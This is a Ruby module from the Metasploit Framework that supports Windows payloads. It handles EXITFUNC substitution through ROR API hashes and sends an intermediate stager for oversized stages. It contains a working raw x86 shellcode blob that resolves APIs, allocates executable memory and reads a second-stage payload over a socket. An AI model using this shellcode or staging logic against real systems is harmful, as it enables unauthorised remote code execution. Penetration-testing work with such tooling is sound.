require 'msf/core'

###
#
# This class is here to implement advanced variable substitution
# for windows-based payloads, such as EXITFUNC.  Windows payloads
# are expected to include this module if they want advanced
# variable substitution.
#
###
module Msf::Payload::Windows

	# 
	# ROR hash associations for some of the exit technique routines.
	#
	@@exit_types = 
		{
			'seh'     => 0x5f048af0, # SetUnhandledExceptionFilter
			'thread'  => 0x60e0ceef, # ExitThread
			'process' => 0x73e2d87e, # ExitProcess
		}

	#
	# This mixin is chained within payloads that target the Windows platform.
	# It provides special variable substitution for things like EXITFUNC and
	# automatically adds it as a required option for exploits that use windows
	# payloads.
	#
	def initialize(info = {})
		if (info['Alias'])
			info['Alias'] = 'windows/' + info['Alias']
		end

		# All windows payload hint that the stack must be aligned to nop
		# generators and encoders.
		super(merge_info(info,
			'SaveRegisters' => [ 'esp' ]))

		register_options(
			[
				Msf::OptRaw.new('EXITFUNC', [ true, "Exit technique: #{@@exit_types.keys.join(", ")}", 'thread' ])
			], Msf::Payload::Windows)
	end

	#
	# Replace the EXITFUNC variable like madness
	#
	def replace_var(raw, name, offset, pack)
		if (name == 'EXITFUNC')
			method = datastore[name]
			method = 'thread' if (!method or @@exit_types.include?(method) == false)

			raw[offset, 4] = [ @@exit_types[method] ].pack(pack || 'V')

			return true
		end

		return false
	end

	#
	# For windows, we check to see if the stage that is being sent is larger
	# than a certain size.  If it is, we transmit another stager that will
	# ensure that the entire stage is read in.
	#
	def handle_intermediate_stage(conn, payload)
		return false if (payload.length < 512)

		# The mid-stage works by reading in a four byte length in host-byte
		# order (which represents the length of the stage). Following that, it
		# reads in the entire second stage until all bytes are read. It reads the
		# data into a buffer which is allocated with VirtualAlloc to avoid running
		# out of stack space or NX problems.
		# See the source file: /external/source/shellcode/windows/midstager.asm
		midstager = 
			"\xFC\x31\xDB\x64\x8B\x43\x30\x8B\x40\x0C\x8B\x50\x1C\x8B\x12\x8B\x72\x20\xAD\xAD" +
			"\x4E\x03\x06\x3D\x32\x33\x5F\x32\x0F\x85\xEB\xFF\xFF\xFF\x8B\x6A\x08\x8B\x45\x3C" +
			"\x8B\x4C\x05\x78\x8B\x4C\x0D\x1C\x01\xE9\x8B\x71\x3C\x01\xEE\x60\x64\xA1\x30\x00" +
			"\x00\x00\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B\x68\x08\x8B\x45\x3C\x8B\x7C\x05\x78\x01" +
			"\xEF\x8B\x4F\x18\x8B\x5F\x20\x01\xEB\x49\x8B\x34\x8B\x01\xEE\x31\xC0\x99\xAC\x84" +
			"\xC0\x74\x07\xC1\xCA\x0D\x01\xC2\xEB\xF4\x81\xFA\x54\xCA\xAF\x91\x75\xE3\x8B\x5F" +
			"\x24\x01\xEB\x66\x8B\x0C\x4B\x8B\x5F\x1C\x01\xEB\x8B\x1C\x8B\x01\xEB\x89\x5C\x24" +
			"\x08\x61\x89\xE3\x6A\x00\x6A\x04\x53\x57\xFF\xD6\x8B\x1B\x68\x40\x00\x00\x00\x68" +
			"\x00\x30\x00\x00\x53\x68\x00\x00\x00\x00\xFF\xD5\x89\xC5\x55\x6A\x00\x53\x55\x57" +
			"\xFF\xD6\x01\xC5\x29\xC3\x85\xDB\x75\xF1\xC3"

		# Prepend the stage prefix as necessary, such as a tag that is needed to
		# find the socket
		midstager = (self.stage_prefix || '') + midstager

		print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")

		# Transmit our intermediate stager
		conn.put(midstager)

		# Sleep to give enough time for the remote side to receive and read the
		# midstage so that we don't accidentally read in part of the second
		# stage.
		Rex::ThreadSafe.sleep(1.5)
	
		# The mid-stage requires that we transmit a four byte length field that
		# it will use as the length of the subsequent stage.
		conn.put([ payload.length ].pack('V'))

		return true
	end

end
